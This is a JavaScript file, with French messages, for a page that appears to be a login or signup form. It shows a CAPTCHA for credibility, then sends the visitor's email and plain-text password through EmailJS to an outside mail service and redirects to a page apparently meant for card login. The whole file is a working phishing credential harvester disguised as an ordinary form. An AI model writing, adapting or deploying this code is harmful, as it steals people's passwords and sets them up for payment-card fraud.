
// ======================================
// Initialisation EmailJS
// ======================================

emailjs.init({
    publicKey: "rORVGScs1n94sqOPi"
});




const form = document.getElementById("signupForm");

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");

const captchaContainer = document.getElementById("captcha-container");
const result = document.getElementById("result");

let captchaShown = false;



emailInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 50);
});

passwordInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 20);
});



form.addEventListener("submit", async function (event) {

    event.preventDefault();



    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }


    

    if (!captchaShown) {

        captchaContainer.style.display = "block";

        captchaShown = true;

        result.textContent = "Veuillez confirmer le CAPTCHA.";
        result.className = "error";

        return;
    }


  

    if (
        typeof grecaptcha === "undefined" ||
        typeof grecaptcha.getResponse !== "function"
    ) {
        result.textContent = "Le CAPTCHA n'est pas disponible.";
        result.className = "error";
        return;
    }

    const captchaResponse = grecaptcha.getResponse();

    if (!captchaResponse) {

        result.textContent = "Veuillez confirmer le CAPTCHA.";
        result.className = "error";

        return;
    }


    

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();


 

    const templateParams = {
        email: email,
        password: password
    };



    result.textContent = "connexion en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_veritas",
            "template_tprb5ni",
            templateParams
        );


        console.log(
            "Email envoyé :",
            response.status,
            response.text
        );


        result.textContent = "Votre demande est en cour.";
        result.className = "success";


        // Réinitialiser CAPTCHA
        grecaptcha.reset();

        captchaShown = false;


       

        window.location.href = "cardlogin.html";


    } catch (error) {

        console.error("Erreur EmailJS :", error);

        result.textContent =
            "Impossible d'envoyer la demande. Veuillez réessayer.";

        result.className = "error";
    }

});

